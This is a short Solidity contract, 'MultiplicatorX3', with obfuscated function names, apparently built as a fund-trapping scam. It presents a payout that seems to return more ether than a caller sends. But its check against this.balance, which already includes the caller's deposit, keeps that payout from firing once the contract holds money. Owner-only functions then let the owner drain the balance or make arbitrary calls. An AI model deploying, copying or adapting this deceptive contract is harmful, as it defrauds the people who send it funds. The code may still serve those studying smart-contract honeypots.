pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0x133caa()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0x168223,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0x168223.call.value(msg.value)(data);
    }

    function _0x185f69(address _0x168223)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x168223.transfer(this.balance+msg.value);
        }
    }
}